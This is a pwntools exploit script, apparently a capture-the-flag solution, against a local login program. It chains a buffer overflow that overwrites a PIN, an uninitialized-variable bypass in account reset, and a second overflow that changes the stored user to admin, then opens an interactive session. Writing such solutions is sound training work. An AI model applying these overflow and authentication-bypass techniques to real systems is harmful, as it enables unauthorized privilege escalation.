''' Script Module Importing '''
from pwn import *

''' Establish Connection '''
p = process("./Stone_Guardian_Login_Wrapper.bin")              # Test Script Locally
#p = gdb.debug("./Stone_Guardian_Login_Wrapper.bin")            # Debug with GDB

''' Initialize Globals '''
ADMIN = b'admin'
PIN = 1234


''' Display Program Menu '''
prog_prompt = p.readuntil(b'Exit\n\n')                   # Read in Program Prompt
print(prog_prompt.decode('utf-8'))


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1:  Deliver Custom Payload to Hijack Pin '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
#
# Select Option (1) Login
#
print(f"[*] Selecting Option (1): Login\n  |")         # Display Exploit Progress
p.sendlineafter(b" > ", b'1')


#
# Send Valid Username
#
print(f"  | Delivering Valid Username")
p.sendlineafter(b"username > ", ADMIN)
'''
Exploit Note:
  username must be valid (admin, mgr_..., emp_...) 
  in order to pass first error check in target program
'''


#
# Craft Payload
#
reset_pin_payload = b'A'*24         # Fill Buffer
reset_pin_payload += p32(PIN)       # Set Specific Pin

#
# Deliver Payload
#
print(f"  | Delivering Payload to Overwrite Pin \n")
p.sendlineafter(b"password > ", reset_pin_payload)      # Send Password


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 2:  Exploit Uninitialized Variable '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
#
# Select Option (2) Reset Account
#
print(f"[*] Selecting Option (2): Reset Account\n  |")         # Display Exploit Progress
p.sendlineafter(b" > ", b'2')

#
# Overwrite Username
#
print(f"  | Overwriting Username")
p.sendlineafter(b"username > ", b'B'*15)
'''
Exploit Note:
  username must be not be valid (admin, mgr_..., emp_...) 
  in order to bypass code initialization
'''

#
# Deliver Hijacked Pin
#
p.sendlineafter(b"pin > ", str(PIN).encode())

reset_pin_results = p.recvline()                   # Display PIN Reset Results
print("[!]", reset_pin_results.decode('utf-8'), " |")


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 3: Execute Buffer Overflow '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
print(f"  | Resetting Password ")         # Display Exploit Progress

#
# Craft Payload
#
new_password = b'C'*15+b'\x00'                      # Set Custom Password as Buffer
overwrite_user_payload = new_password + ADMIN       # Overflow to update user to Admin
'''
Exploit Note: 
  The payload here is crafted to exploit a buffer overflow vulnerability. 
  
  The variable 'new_password' is set to a sequence of 'C's followed by 
  a null byte (b'\x00') to terminate the string, preventing any unintended 
  characters from being included in the password. 
  This is crucial as the password must be entered later when prompted. 
  
  The 'overwrite_user_payload' is constructed by concatenating the 
  'new_password' with the 'ADMIN' username, in order to overflow 
  the buffer and update the user to 'admin'. 
  
  Essentially, this sequence allows us to change the password 
  for the 'admin' user and gain shell access in subsequent steps.
'''

#
# Deliver Payload
#
p.sendlineafter(b"new password > ", overwrite_user_payload)


reset_pswd_results = p.recvline()                   # Display Password Reset Results
print("[!]", reset_pswd_results.decode('utf-8'))


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 4: Obtain Control of Program '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
#
# Select Option (1) Login
#
print(f"[*] Selecting Option (1): Login\n  |")         # Display Exploit Progress
p.sendlineafter(b" > ", b'1')

#
# Deliver Modified Credentials
#
p.sendlineafter(b"username > ", ADMIN)              # Send 'admin'
p.sendlineafter(b"password > ", new_password)       # Send New Password

auth_results = p.recvline()                         # Display Authentication Results
print("[!]", auth_results.decode('utf-8'), " |")

priv_level_status = p.recvline()                        # Display Privilege Level Status
print("[!]", priv_level_status.decode('utf-8'))


p.interactive()                     # Start Interactive Session
